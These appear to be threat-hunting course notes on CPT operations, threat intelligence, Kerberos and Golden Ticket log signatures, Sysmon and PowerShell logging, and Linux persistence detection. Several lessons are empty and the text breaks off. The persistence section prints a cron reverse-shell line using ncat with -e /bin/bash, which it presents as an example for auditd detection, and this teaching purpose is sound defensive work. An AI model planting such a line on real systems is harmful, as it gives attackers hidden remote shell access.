########## M1 L1 ############
######### Intel-Driven Threat Hunting ###########

This lesson explains the six distinct steps of the CPT OP with regard to threat hunting:
Objectives, Effects, Guidance
Terrain Identification and Prioritization 
Capability Analysis and Force Allocation
Orders Production and Dissemination
Tactical Planning and Mission Execution
Assessment

![image](https://github.com/user-attachments/assets/fe9aebca-9858-41fa-843c-3258e69d7a17)

-----------------------------------------------------------------------------------------------------------------------
Policies, Procedures, and Regulations 

Another critical component of the CPT OP are the policies, procedures, and regulations that leadership and governing bodies establish for hunt missions. There are numerous additional guidelines that govern the CPT. However, the following two Titles of the United States Code are the most noteworthy:

Title 10. Concerns military operations and provides the legal basis for the roles, missions, and organization of each of the services as well as the Department of Defense (DoD).

Title 50. Concerns intelligence organizations and provides guidance for how to conduct intelligence-gathering efforts. Also provides governance for other national defense activities.

Step 1: Objectives, Effects, and Guidance
![image](https://github.com/user-attachments/assets/8a3c841f-8eae-4db2-be2a-024549315d31)

Step 2: Terrain Identification and Prioritization
![image](https://github.com/user-attachments/assets/293bce66-d0ca-4139-ad61-af054577cda4)

Step 3: Capability Analysis and Force Allocation
![image](https://github.com/user-attachments/assets/c0f8369a-8763-4c59-8449-d047d8e40bb5)

Step 4: Orders Production and Dissemination
![image](https://github.com/user-attachments/assets/9d95853d-72da-47cf-ba5e-d51c4af9ad67)

Step 5: Tactical Planning and Mission Execution
![image](https://github.com/user-attachments/assets/80ecb239-64d8-493a-a16c-6e5c67e6b261)

Step 6: Assessment
![image](https://github.com/user-attachments/assets/b63f14b4-449a-48a2-b75a-da54670a77eb)

------------------------------------------------------------------------------------------
Cyber Threat Hunting

CTH is the process of actively searching information systems to identify and stop malicious cyberspace activity. The term “hunting” refers only to internal defensive measures that require maneuver within the defended network to identify, locate, and eradicate an advanced, persistent threat. A primary component of threat hunting is based on detecting TTPs. 

CTH Kill Chain

The Start. Search for MCA by filtering out legitimate or expected activity on the network.
Refinement. Find suspicious activity. This triggers a deeper investigation and increases search efforts. 
Discovery. Discover the root cause of the malicious behavior. 
Response. Calculate and assess the attack. Remediate the threat based on this information.
Continuous Improvement. Update defenses to prevent future attacks that use the same TTPs discovered during the hunt. 

![image](https://github.com/user-attachments/assets/a9654baa-53fd-466d-8b41-ead98a5d78a1)

What is NOT CTH

CTH starts before any threat has been found. On the other hand, practices such as incident forensics or incident response occur after identifying an incident or compromise. The aim of CTH is to illuminate an adversary before a known incident. This requires analyzing the current environment and its conditions to identify any evidence of intrusion or compromise before any are known to exist.

-------------------------------------------------------------------------------------

CTH Methodologies

-Analytics-driven

The analytics-driven methodology leverages data and analytics. This methodology applies complex queries and algorithms to data sets, often using software  automation. A key distinction with the analytics methodology is that it does not require physical access to local machines, networks, or systems. CTH analysts   using the analytics-driven methodology gather data artifacts consisting of sensor alerts, system logs, and network traffic. Combining knowledge of data artifacts   with knowledge of automated analysis capabilities allows the analysts to develop a picture of the network terrain.

-Situational awareness-driven

The situational awareness-driven methodology leverages an advanced understanding of a particular cyberspace terrain to detect anomalous activity. Similar to the analytics methodology, situational awareness does not require physical access to local systems. Data artifacts pertaining to the operating environment are critical to this methodology. CTH analysts examine data artifacts over time in order to understand system normality and detect outliers in behavior. This often leads to discovering potential MCA.

-Intelligence-driven

The intelligence-driven methodology leverages timely, accurate, mature Cyberspace Threat Intelligence (CTI) to detect advanced cyberspace threats. The intelligence-driven methodology requires physical access to local systems.

-------------------------------------------------------------------------------------

Cyber Threat Intelligence Overview

Analysts using the intelligence-driven methodology leverage CTI. CTI is information that has been analyzed to aid an organization in identifying, assessing, monitoring, and responding to cyber threats. Organizations generally produce various types of CTI, which they can share internally for CTH. Information may also be derived externally, from outside of the organization. Examples of CTI include:

Indicators (system artifacts or observables associated with an attack)
TTPs
Security alerts
Threat intelligence reports
Recommended security tool configurations

CTI can trigger a hunt operation by warning of an imminent or already-realized cyber attack, or by reporting on new indicators or adversaries that were recently seen in the wild. 

Types of CTI 

Organizations develop different types of CTI, depending on who is receiving the information and what details it includes. The three categories of CTI include the following:

Strategic. Broad, general information that provides high-level threats and activities in a non-technical delivery.

Tactical. TTP outlines for a technical delivery that explains how the adversary may attempt to attack the network. 

Operational. Purely technical information about specific attacks, experiences, or campaigns that provides actionable information regarding activities that have been previously identified.

CTI Sources

CTI is derived from both internal and external sources. Internal refers to CTI collected from within the network or organization where the hunt operation is occurring. Internal CTI typically includes artifacts such as network event logs, IP Addresses, or records of past incident responses. External CTI refers to CTI collected from sources outside of (or "external" to) the network or organization where the hunt operation is occurring. External CTI typically includes artifacts such as those found on the open internet or technical sources (such as MITRE ATT&CK). A key benefit of external CTI is that organizations can leverage the collective knowledge, experience, and capabilities from the community to gain a more complete understanding of the threats the organization may face. 

-------------------------------------------------------------------------------------

IOCs

As defined by the CWP an IOC is, “a forensic artifact observed on a computer network or in a computer operating system which indicates an intrusion.” IOCs change and can take on a wide variety of topics and forms. Some common IOCs include the following:

Unexpected network traffic (inbound or outbound)
Unusual internet protocol (IP) addresses
Connections to strange geographic areas
Increased activity by a privileged user
Increased volume of data transmission

TTPs

TTPs are a chain, or sequence, of actions taken by the adversary during their actions or campaign. There is a wide variety of TTPs, however, some common TTPs include using a specific malware variant, attack tool, delivery mechanism (such as phishing), or exploit.

TTPs are located at the top of the pyramid. According to Bianco, “at the apex are the TTPs. When you detect and respond at this level, you are operating directly on adversary behaviors, not against their tools.” 

 ![image](https://github.com/user-attachments/assets/cc916015-64a7-4c1d-b782-537e99772e7d)
 
-------------------------------------------------------------------------------------

######### M1 L2 ########
########## Developing a Hunt Hypothesis ###########

What is Threat Hunting?

hreat hunting is the proactive and iterative search through networks, endpoints, or datasets to detect unknown malicious, suspicious, or anomalous activities that have not been detected by existing automated tools. Successful threat hunting requires an understanding of adversary activity. The Lockheed Martin Cyber Kill Chain is an analytic framework that breaks down the seven phases that a threat follows to achieve an objective, in an attack against an ally network. The attachment Cyberspace Threat Hunting explains the seven phases in greater detail. The phases of the Cyber Kill Chain include the following:

Reconnaissance. The threat collects information on the potential target before any attack actually happens. The threat may still be choosing a target in this phase.
Weaponization. The threat creates a malicious payload to exploit the targeted friendly network. 
Delivery. The threat delivers the malicious payload to the target victim by email or other means. 
Exploitation. The threat exploits a vulnerability identified earlier in order to execute the malicious payload. 
Installation. The threat installs malware onto the victim's network.
Command and Control. The threat creates a Command and Control (C2) channel to continue communication and operations of the installed malware and manipulation of the victim's system. 
Actions on Objectives. The threat performs the steps necessary to achieve its goals within the friendly network.    

What is NOT Threat Hunting

There are a few clear lines between threat hunting and other cybersecurity tasks, such as incident response. Some organizations may be organized such that threat hunting and incident response are done by the same set of personnel. However, each activity has its unique traits and goals that differentiate it from one another. Incident response is the organization's process to investigate a known or suspected cybersecurity incident. The following tasks are not considered part of threat hunting tasks. Instead, they are often conducted in parallel with threat hunting or may be initiated by threat hunting.

Incident response of a reported compromise. The goal of threat hunting is to identify evidence of unknown or unreported Malicious Cyberspace Activity (MCA) that may indicate a compromise or intrusion.

Installing tools and waiting for alerts. Threat hunting requires proactive analysis and data of adversary Tactics, Techniques, and Procedures (TTP) in order to identify MCA.

Reporting on incidents or intrusions. An incident response team provides in-depth analysis and reporting on an identified intrusion. Threat hunting identifies MCA prior to a known incident.

Incident forensics. This is performed by an incident response team after suspected MCA has been identified.

-------------------------------------------------------------------------------------

What is a Hunt Hypothesis?

A good hunt hypothesis accomplishes the following goals:
Direct analysts towards potential analysis methods.
Propose what attacker activity might look like when found.
Identify likely sources of evidence to hunt within.
Provide a path for analysts to follow to prove or disprove the hypothesis.


-------------------------------------------------------------------------------------

Tactics, Techniques, and Procedures (TTP)

T1589.001 Gather Victim Identity Information: Credentials
FARMCHASER has made use of victim organizations' account credentials by using methods such as phishing for information. They have been known to use compromised credentials in order to access sensitive information. 


T1212 Exploitation for Credential Access
FARMCHASER has also been known to exploit software vulnerabilities in order to collect victims' credentials. They tend to target Kerberos in order to gain domain user permissions on a system.


T1136.001 Create Account: Local Account
T1136.002 Create Account: Domain Account
FARMCHASER has created both local machine accounts and domain accounts in order to maintain persistence within an environment.


T1098 Account Manipulation
FARMCHASER has added, compromised, or maliciously created accounts to privileged security groups in order to maintain elevated access to victim networks.


T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage
FARMCHASER has used cloud storage services such as Dropbox or OneDrive to exfiltrate data over the internet.


T1039 Data from Network Shared Drive
FARMCHASER often searches through network shares on computers that they have compromised to find files of interest. Sensitive data that is found is collected in a central network location prior to exfiltration.


T1005 Data from Local System
FARMCHASER tends to also search local file systems or databases for sensitive files. 


T1114 Email Collection
FARMCHASER has targeted user email to collect sensitive information. The email subjects typically contain words such as payment, invoice, or urgent. 

-------------------------------------------------------------------------------------

Possible Hypotheses
There are multiple hypotheses that can be made from the FARMCHASER threat intel brief and TTPs. Some possible hypotheses that could have been created include the following: 


FARMCHASER uses compromised credentials to access sensitive information.
FARMCHASER may create new user accounts within Active Directory (AD).
FARMCHASER may grant permissions to user accounts by adding them to the local Administrators security group.
FARMCHASER may grant permissions to user accounts by adding them to the Domain Admins or Backup Operators AD groups.
Malware is exfiltrating sensitive data to the internet from at least one of the domain controllers.
Malware is exfiltrating sensitive data to the internet from at least one of the servers responsible for the storage of that data.
FARMCHASER accesses sensitive data from servers by pivoting from systems defined in the tactical KT-C.
A local secondary system is connecting to the domain controller to gain access to sensitive information.

 
-------------------------------------------------------------------------------------
Identifying and Collecting Data for Hunting

A CPT identifies the key tasks to meet the goals of the hunt operation when creating their tactical plan. For hunting operations, these key tasks include high-level hunt topics that can be broken down into individual hunts. In terms of collecting data from these data sources, a CPT must be prepared to adapt to a wide array of situations. No set plan can be established for collecting data from an environment, due to the variety of data sources available and the differences between networks. 


There are multiple different ways a CPT can collect data from data sources. A CPT could gain access to a pre-existing data source owned by the local network operators or could ask local administrators to configure a pre-existing stream to send data into the CPT's systems. A CPT could also gather data themselves by configuring a network tap or collecting the data directly from the endpoints if possible. A CPT should be familiar with the different types of data sources and security-related data that can exist within an environment. This allows the CPT to make informed decisions about which data sources are the most valuable during a hunt.


The following are broad categories of the different types of logs that an analyst could use during a hunt:
Host
Network
Security Appliance
Application

Host Logs

Each Operating System (OS) generates its own host logs. A wide variety of different host logs are available, but not all of them are security-focused. Additionally, different OSs contain different types of host logs, and CPT analysts that are performing a host log investigation must learn to use and examine different sources, types, and qualities of logs that each OS generates. 


The following are examples of some of the events that an OS generates that can be useful in a hunt:
A process that was started or stopped
A network connection that was attempted and failed
Multiple failed user logon attempts
An unknown device that was plugged into a system
Changes to system settings
Registry additions or modifications

Network Logs


Network logs are generated by software or devices that are connected to the network. They contain information about a connection such as its source, destination, associated ports, and the amount of data being transferred. Some network logs are generated as part of normal OS activity and may be accessed in the same way the host logs are accessed. Other, more advanced network logs are generated by networking appliances such as routers, firewalls, or proxy devices. 


Security Appliance Logs      


Security appliance logs are logs that are generated by a security appliance such as an intrusion detection system (IDS), anti-virus scanning devices, or content-filtering devices. These logs are typically related to potential malware or an IDS that has detected network traffic that patterns a potential attack since the goal of most security appliances is to prevent or detect MCA. 


Application Logs


Application logs are any logs that are generated by an individual application. Not all applications generate logs, and not all application logs are useful to an application. However, application logs can be useful to analysts in order to gain additional information on an attack, or when a specific application is exploited during an attack. Application logs can also be useful to analysts as a source of evidence or to fill potential visibility gaps in an investigation.

-------------------------------------------------------------------------------------

########### M1 L3 ##############
################ Surveying the Attack Surface ####################



![image](https://github.com/user-attachments/assets/3166acdd-5643-4d62-8b0f-0f589b507c10)


---------------------------------------------------------------------
Pre-Authentication Brute Force Logs


The process of brute-forcing these accounts leaves some forensic residue in the logs. These authentication failures are not logged with a normal event ID 4625: An account failed to log on. Instead, they produce an event ID 4771 which is only on the DC. This event ID is described below:


Event ID: 4771, Kerberos pre-authentication failed
Result Code: 0x18 KDC_ERR_PREAUTH_FAILED
Bad password
Result Code: 0x6 KDC_ERR_C_PRINCIPAL_UNKNOWN
Kerberos produces an error if the username is incorrect. Attackers can leverage this to guess usernames.

Defenders should monitor the following with this event log and attack:
High-value accounts, such as domain admins
Off-hours logs
Inactive accounts
Client Address field is outside the internal range
Large volume of logs
Incorrect pre-authentication type for the network
If only smartcards are allowed within the network (pre-authentication type 15) and the 4771 log shows a failure with pre-authentication type 2, then something is trying to use a password.




Golden Ticket Logs


Logging associated with a Golden Ticket is an exploit technique, but not directly due to a flaw in Kerberos. The tools executing this attack do not work exactly the same way that the native windows systems work. This creates anomalies within the logging. Below is a snapshot of the event logs associated with this attack and some notable features. The main point of this data is that hacking tools tend to leave odd entries within logs that will be inconsistent with how the legitimate system tools create logs.


Event ID: 4769, A Kerberos service ticket was requested
Location: Domain controller
Notable activity is a TGS being requested without a preceding TGT 

Event ID: 4627, Group membership information
Location: workstation/Domain controller	

Event ID: 4624, An account was successfully logged on
Location: workstation/Domain controller
Field: Account Domain may be the Fully Qualified Domain Name (FQDN) when it normally is the short domain name
Field: IpAddress may indicate the compromised host

Event ID: 4672, Admin Logon
Location: workstation
Field: Account Domain may be blank when it normally is the short domain name

Event ID: 4634, Account Logoff
Location: workstation
Field: Account Domain may be blank when it normally is the short domain name

---------------------------------------------------------------------
########## M1 L4 ############
############# Log Aggregation and Parsing ############








---------------------------------------------------------------------

########## M2 L2 ############
############# Splunk Refresher ############









---------------------------------------------------------------------

########## M2 L3 ############
############# Options for Endpoint ############








---------------------------------------------------------------------

########## M2 L4 ############
############# Options for the Network ############








----------------------------------------------------------------------

########## M2 L5 ############
############# Windows Event Monitoring ############


Configuring a robust logging solution comprises more than just configuring the subcategories in the audit policy. There are several powerful ways to get more robust logging out of a Windows system. These ways also allow more effective log tuning to produce the data sources required to help analysts identify threat actors. The next few sections of this lesson introduce the logging options available in the following tools:
Native WindowsSysmonPowerShell specific options
Native Windows Logging Configuration Options


The security backbone of a Windows network starts with the native Windows logging options. The temptation is to enable all logging options, however excessive logging has additional costs that hamper proper defense. There are two locations on a system that allow malware to persist after a reboot. These are the file system and the registry.


File System Logging


File system changes create logs with the Event ID 4663: An attempt was made to access an object. This requires the following subcategories to be enabled:
Audit File SystemAudit Kernel ObjectAudit RegistryAudit Removable Storage
Registry Logging


The registry houses Windows configuration information and a significant amount of forensic data. Hundreds, if not thousands, of registry changes happen every minute. While logging registry changes create useful data, they create as much, if not more, unusable data.






Sysmon Events
Event ID 1: Process creation
Event ID 2: A process changed a file creation time
Event ID 3: Network connection
Event ID 4: Sysmon service state changed
Event ID 5: Process terminated
Event ID 6: Driver loaded
Event ID 7: Image loaded
Event ID 8: CreateRemoteThread
Event ID 9: RawAccessRead
Event ID 10: ProcessAccess
Event ID 11: FileCreate
Event ID 12: RegistryEvent (Object create and delete)
Event ID 13: RegistryEvent (Value Set)
Event ID 14: RegistryEvent (Key and Value Rename)
Event ID 15: FileCreateStreamHash
Event ID 16: ServiceConfigurationChange
Event ID 17: PipeEvent (Pipe Created)
Event ID 18: PipeEvent (Pipe Connected)
Event ID 19: WmiEvent (WmiEventFilter activity detected)
Event ID 20: WmiEvent (WmiEventConsumer activity detected)
Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)
Event ID 22: DNSEvent (DNS query)
Event ID 23: FileDelete (File Delete archived)
Event ID 24: ClipboardChange (New content in the clipboard)
Event ID 25: ProcessTampering (Process image change)
Event ID 26: FileDeleteDetected (File Delete logged)


![image](https://github.com/user-attachments/assets/fec25dd1-28d7-4c5a-8e35-ab4ce6f9db81)


Critical


The following events should be enabled because they each have unique advantages and manageable false positives. If the event creates a lot of noise, it would still be possible to configure Sysmon to reduce the noise. In the table, these events are marked with a red icon:
Event ID 1: Process creation
Event ID 2: A process changed a file creation time
Event ID 4: Sysmon service state changed
Event ID 6: Driver loaded
Event ID 7: Image loaded
Event ID 9: RawAccessRead
Event ID 15: FileCreateStreamHash
Event ID 16: ServiceConfigurationChange
Event ID 17: PipeEvent (Pipe Created)
Event ID 18: PipeEvent (Pipe Connected)

Overlapping


The events marked with a yellow icon in the table are recommendations for events to enable if they’re not already addressed by other systems. Within a production network, these events cause excessive logs that do not provide much benefit. However, in a controlled lab setting, these events are useful for investigations:
Event ID 3: Network connection
Event ID 5: Process terminated
Event ID 22: DNSEvent (DNS query)


![image](https://github.com/user-attachments/assets/5a733338-eaa3-4eec-9e69-fae2549fc76f)


As another example, Sysmon Event ID 5: Process terminated provides only the process Globally Unique Identifier (GUID) over the equivalent native Windows log. The native logging event 4689: A process has exited provides the process's exit code, which Sysmon does not provide. Figure 2.5-5 lists this comparison between this Sysmon and Windows events details.


![image](https://github.com/user-attachments/assets/d410f8c2-dbf1-44a6-83a7-a553831fd1db)


Threat-Specific


Some Sysmon events should be enabled for specific threats. The table uses a blue icon to identify these items. Each of the following events is best enabled only during very specific situations. They each require effort to tune properly and effectively. 
Event ID 8: CreateRemoteThread
Event ID 10: ProcessAccess
Event ID 11: FileCreate
Event ID 12: RegistryEvent (Object create and delete)
Event ID 13: RegistryEvent (Value Set)
Event ID 14: RegistryEvent (Key and Value Rename)
Event ID 19: WmiEvent (WmiEventFilter activity detected)
Event ID 20: WmiEvent (WmiEventConsumer activity detected)
Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)
Event ID 23: FileDelete (File Delete archived)
Event ID 24: ClipboardChange (New content in the clipboard)
Event ID 25: ProcessTampering (Process image change)
Event ID 26: FileDeleteDetected (File Delete logged)


Extensive Filtering


The following event logs require extensive filtering. The two ways to filter are by inclusion or by exclusion. Include-based filtering only logs events that are explicitly defined. Exclude-based filtering logs all events.
Event ID 1: Process creation
Event ID 5: Process terminated
Event ID 11: FileCreate
Event ID 12: RegistryEvent (Object create and delete)
Event ID 13: RegistryEvent (Value Set)
Event ID 14: RegistryEvent (Key and Value Rename)
Event ID 22: DNSEvent (DNS query)

PowerShell Logging Options
PowerShell auditing is incredibly useful for a defender. PowerShell scripts are not normally executed by users, yet are frequently leveraged to execute most Windows exploitation techniques. PowerShell is not just a scripting language, it has the same power as a compiled binary. PowerShell is so integral to Windows exploitations, Microsoft released a patch to add additional logging capabilities in an effort to combat hackers. PowerShell logs contain information regarding PowerShell operations, such as starting and stopping the application, cmdlets used, and files accessed. PowerShell logs may be accessed in a variety of channels, such as directly within a PowerShell session or within the C:\Windows\System32\winevt\Logs directory. PowerShell logging does not work like other native Windows logging categories. It is verbose enough that Sysmon created specific events for PowerShell. Examples of useful Windows Event IDs are as follows:﻿﻿

4688: A new process has been created: New PowerShell commands create the following event when the subcategory Audit Process Creation is configured.

400: Engine state is changed from None to Available: Details when the PowerShell EngineState has started.

800: Pipeline execution details for command line: Write-Host Test: Details the pipeline execution information of a command executed by PowerShell.

Enhanced PowerShell Logging
﻿

Although Microsoft designed PowerShell as a useful tool for administrators, it became a prized tool for hackers, as well. PowerShell works on the Microsoft .NET framework, which borrows its design pattern from the programming language Java. The Java language design minimizes compile times and allows software to work on various types of processors. This makes PowerShell more than just a command-line administration tool. The Java-based design of the .NET framework enables PowerShell to have the exact same capabilities of compiled software, but without requiring a binary on the system.

﻿

The hacking world rapidly adopted PowerShell-based exploitation techniques due to these capabilities. Microsoft responded by adding enhanced PowerShell logging features. Windows 10 has enhanced PowerShell logging natively. Older versions of Windows may need updates to provide enhanced PowerShell logging. This layered approach means that the configuration of PowerShell logging is non-conventional and is not configured the same as other logging. The enhanced PowerShell logging introduced in 2015 has three configurable logging capabilities:

Module logging

Script block logging

Transcription logging

Module Logging
﻿

PowerShell Module Logging records the commands executed and portions of the scripts, but does not deobfuscate all code. This means attackers can create code that is intentionally obscure and confusing. To enable module logging, make the following changes to the registry:

HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging
EnableModuleLogging = 1
﻿

This enables logging for the following Event ID:

4103: Executing Pipeline

﻿

Script Block Logging
﻿

Script block logging logs PowerShell scripts as they are executing within the PowerShell engine. This deobfuscates any PowerShell scripts. Prior to this feature, attackers would create scripts that appeared either benign or unintelligible, then the script would change itself just prior to execution. With script block logging enabled, the entire script is logged after it is processed. This shows the deobfuscated code to defenders. To enable script block logging, make the following changes to the registry:

HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
EnableScriptBlockLogging = 1
﻿

This enables logging for the following Event ID:

4104: Execute a Remote Command

﻿

Transcription Logging
﻿

Transcription logging makes a record for every PowerShell session, including all input and output with timestamps. This is displayed at the command line terminal. To enable transcription logging, make the following changes to the registry:

HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription\
EnableInvocationHeader = 1
EnableTranscripting = 1
OutputDirectory = <path_to_directory>
﻿

This enables logging of the shell's transcript to the configured output directory. 


erberos Review


Kerberos is a domain authentication protocol that is commonly used within Windows domains. The two functions of Kerberos is to authenticate the user, then grant tickets based on permissions. A previous lesson explored Kerberos in greater detail. 


Figure 2.5-6 illustrates the three typical steps to authenticate and request access to a service using Kerberos. The steps are as follows:
Request and Receive TGT: A user authenticates by requesting a ticket-granting-ticket (TGT) from the Domain Controller (DC) which acts as the Key Distribution Center (KDC).
Request and Receive Service Ticket: User requests access to a resource by requesting a Service Ticket, referred to as a Ticket Granting Service (TGS).
Request Access to Resource: User requests the resource from the Application Service by sending the TGS.


![image](https://github.com/user-attachments/assets/ea07e7bb-c7a6-4902-b094-5312fd8eb9f9)


Expected Kerberos Logs


Each step of the Kerberos protocol is expected to create specific logs during normal operation. Recognizing which logs are expected helps defenders discern normal activity from unusual and possibly malicious activity. Each logging event listed below occurs in the DC.


Step 1: Request and Receive TGT


Requesting the TGT (AS_REQ)


The aim of the first step in the protocol, as illustrated in Figure 2.5-7, is for the user’s workstation to obtain the TGT by sending the DC an Authentication Service Request (AS_REQ). The default setup for a domain requires pre-authentication. Pre-authentication requires the AS_REQ to have a timestamp encrypted by the user's password. When the DC receives the TGT request, it verifies the timestamp with its own time to ensure that it is a valid time within the past few minutes. This is why, if the time is off on a workstation, it may not be able to authenticate to the domain. The DC returns the TGT, which includes additional session information that is encrypted with the user's password.


![image](https://github.com/user-attachments/assets/5712008a-cfa4-4b26-9305-da194e706b7b)


Disabling pre-authentication allows anyone to request a TGT for any user. The TGT response reveals that the session key used for the next step is encrypted by the user's password hash.


Expected Logging
Event ID: 4768, A Kerberos authentication ticket (TGT) was requested. 
Event Type: Failure, if the request fails.


Receiving the TGT (AS_REP)


For Kerberos to grant tickets based on permissions, Windows adds a Privilege Attribute Certificate (PAC) to the TGT. In Linux environments, this field is blank. The PAC includes the user's IDs as well as group memberships. This section is signed by the domain's Kerberos account on the DC: krbtgt.


Expected Logging
Event ID: 4768, A Kerberos authentication ticket (TGT) was requested.
Event Type: Success, when a TGT is returned.


Step 2: Request and Receive Service Ticket


Requesting the TGS (TGS_REQ)


After the TGT is issued, the user is authenticated to the domain. To gain access to a resource within the domain, the user's account needs to request a service ticket. This request requires the session key that was encrypted by the user's password hash from the previous step, as well as the TGT. Figure 2.5-8 illustrates this step.


![image](https://github.com/user-attachments/assets/4f3f31ee-7869-43f5-83af-4d8395fe1d5f)


Expected Logging
Event ID: 4769, A Kerberos service ticket was requested. 
Event Type: Failure, when a TGS request fails.


Receiving the TGS (TGS_REP)


The TGS includes a new session key for the service which is encrypted by the previous session key. The TGS is encrypted with the application server key so that it can be presented to the application service, in the next step, with the username and timestamp encrypted by the new session key.


Expected Logging
Event ID: 4769, A Kerberos service ticket was requested. 
Event Type: Success, when a TGS is returned.

Event ID: 4770, A Kerberos service ticket was renewed. 
Event Type: Only successful when the TGS is renewed.


Step 3: Request Access to the Resource


The final step, as illustrated in Figure 2.5-9, is the user's workstation presenting the TGS from step two to the application server for the resource. This step includes optional mutual authentication and an optional PAC check. The PAC check is discussed below.


![image](https://github.com/user-attachments/assets/e3eb968d-9a6b-408b-a2fd-2df646d8ee0b)


Checking the PAC (optional)


Going back and having the application server verify the PAC sounds foolproof, but there are several important caveats that do not prevent any Kerberos-based attacks at this point. 


Make the following changes to the registry to enable this option:
HKLM/SYSTEM/CurrentControlSetControl/Lsa/KerberosParameters/
ValidateKdcPacSignature = 1



This option appears to provide no additional security. It is unclear the exact circumstances when Windows enforces PAC checking. Windows released a confusing statement about PAC checking in an official blog post describing the conditions when Windows would not check the PAC. What is clear is the only exploit that has manipulated a PAC was patched in 2014. Even with that patch removed and PAC checking enabled, security researchers have demonstrated successfully exploiting a DC with the silver ticket attack.


The event 4768 is when a TGT is requested. There is never a situation where a TGS can be used without a TGT being requested from that system.


. Search for all systems through which the user iker.mckay submitted a TGT request by entering the following:
winlog.event_id: 4768 AND winlog.event_data.TargetUserName: iker.mckay



The following search query identified all systems that requested a TGS (event 4769) for the user iker.mckay in Step 7:
winlog.event_id: 4769 AND winlog.event_data.TargetUserName: iker.mckay





3. Change the working directory to the trainee's desktop by entering the following command:
PS C:\Windows\system32> cd C:\Users\trainee\Desktop



NOTE: If the PowerShell terminal does not have administrative privileges, some log sources are not searchable by the executed commands. These privileges are necessary for this lab.


4. Declare the start time Mar 2, 2022 @ 16:00:00 as a variable by entering the following command:
PS C:\Users\trainee\Desktop> $start = "2022-03-02 4:00:00 PM"



5. Declare the end time Mar 2, 2022 @ 16:20:00 as a variable by entering the following command: 
PS C:\Users\trainee\Desktop> $end = "2022-03-02 4:20:00 PM"



6. Search for Windows PowerShell commands that happened between the selected times from the Windows_PowerShell.evtx file by entering the following command:
PS C:\Users\trainee\Desktop> Get-WinEvent -FilterHashTable @{path="Windows_PowerShell.evtx"; StartTime=$start; EndTime=$end}


Search for mimikatz across the Windows PowerShell log by entering the following command:
PS C:\Users\trainee\Desktop> Get-WinEvent -FilterHashTable @{path="Windows_PowerShell.evtx"; StartTime=$start; EndTime=$end} | Where-Object {$_.Message -Match ".*mimikatz.*"}



The final set of curly brackets in the command in Step 7 uses the notation $_ to declare a temporary variable for the item in the list. This means the function Where-Object is iterating over each item in the list and putting its value into that temporary variable. 


In this context the function Where-Object filters the results based on where the data is that matches the regular expression.


8. Search for mimikatz across all the event logs by entering the following command:
PS C:\Users\trainee\Desktop> Get-WinEvent -FilterHashTable @{path="*.evtx"; StartTime=$start; EndTime=$end} | Where-Object {$_.Message -Match ".*mimikatz.*"}


########## M3 L1 ############
############# Recognizing Reconnaissance ############


![image](https://github.com/user-attachments/assets/0380bd90-f18b-4fe3-8998-36104b814ba1)

![image](https://github.com/user-attachments/assets/bc03b2ae-ccd9-40b0-a05b-452c1434c9af)



########## M3 L2 ############
############# Recognizing Exploitation Attempts ############







########## M3 L3 ############
############# Recognizing Exploitation Attempts ############


Cron Jobs


Cron jobs are the primary method used to create a persistent scheduled task in Linux. Adversaries use this Linux feature to configure persistence. There are many ways cron is used for persistence. For example, a cron job is created to run on reboot, which creates a netcat session. The session creates a reverse shell to the adversary’s box, which is listening for the connection. Below is an example of such a cron job:
@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash

To detect this type of activity, Linux Audit Daemon (Auditd) rules need to be in place to audit when changes are made to the system's cron tables. Below are examples of auditd rules from Florian Roth's Auditd configuration available on GitHub:
-w /etc/cron.allow -p wa -k cron-w /etc/cron.deny -p wa -k cron-w /etc/cron.d/ -p wa -k cron-w /etc/cron.daily/ -p wa -k cron-w /etc/cron.hourly/ -p wa -k cron-w /etc/cron.monthly/ -p wa -k cron-w /etc/cron.weekly/ -p wa -k cron-w /etc/crontab -p wa -k cron-w /var/spool/cron/ -k cron

The rule syntax follows the standard, which was pulled from the audit.rules man page:
-w path-to-file -p permissions -k keyname



The permissions include one of the following:
r: Read the file.w: Write to the file.x: Execute the file.a: Change the file's attribute.

The default Auditbeat configuration parses the keyname from these audit rules to the tag field. This makes hunting using specific audit rules much more convenient. Check the audit rule keyname to hunt on and start hunting using a search similar to the following:
tag: cron



The downside to hunting for persistence via cron using logging is that the logs do not show the actual cron job. The only time persistence is logged is when one of the cron files is altered. This means that determining if a change to the cron jobs was malicious requires access to the endpoint to check the list of cron jobs using the following command:
crontab -l



Several events trigger when crontab is used to view cron jobs with -l or -e. However, when a change is made to a cron file, there are events with an event.action of renamed and changed-file-ownership-of. These events are important to audit. If a modification to cron jobs is detected on a host, the cron file that was modified should be reviewed for suspicious cron jobs.


Account Creation


Creating an account is another way a threat actor obtains persistence on a Linux system. Using the Elastic standard Auditbeat configuration captures the required data to detect this method of persistence. However, if a custom configuration is in use, it needs to have the system module’s user dataset enabled to monitor useradd activity.


To ensure accounts are not being created for persistence, events with an event.action of user_added and a system.audit.user.group.name of root should be audited. Root users should only be created when absolutely necessary so as to not create an excess of noise. However, this varies depending on the specific network being hunted on.


UNIX Shell Configuration Modification


Modifying profile configuration files in Linux is a common way threat actors gain persistence. It is as easy as echoing a malicious shell script into /etc/profile, /etc/.bashrc, or /etc/bash_profile (or other system or user shell configuration files) to call home to set up a reverse shell upon spawning of a new interactive or non-interactive shell. Using the file integrity module in Auditbeat allows for tracking changes to these profiles. An event with an event.action of updated or attributes_modified and a file.path of one of the profile paths (i.e., /etc/profile) indicates that the profile was modified. If this is observed, reviewing the profile modified on the host for changes is ideal, but if the host is unable to be accessed, expanding the search to view events surrounding the modification may reveal the threat actor’s command that made the change.


Network Flow


In addition to detecting persistence directly by looking for changes to files and commands being run, checking for beaconing activity can also provide valuable information. Auditbeat's system module provides events with an event.action of network_flow, which are useful for detecting suspicious beaconing activity using the search result chart in Kibana.


These are just a few examples of persistence methods threat actors use. To be a successful defender, continuous learning is a must. Keeping up to speed with MITRE ATT&CK helps stay current on methods used and how to properly hunt for the activity.


Detecting Persistence Explained
During the unassisted hunt for persistence, seven persistence methods were located in the logs. Explanations and detection of the following methods are revealed below:

Registry Run Keys

Scheduled Tasks

BITS Jobs

Services

Cron Jobs

Account Creation

UNIX Profile Configuration Modification

Registry Run Keys
﻿

Description
﻿

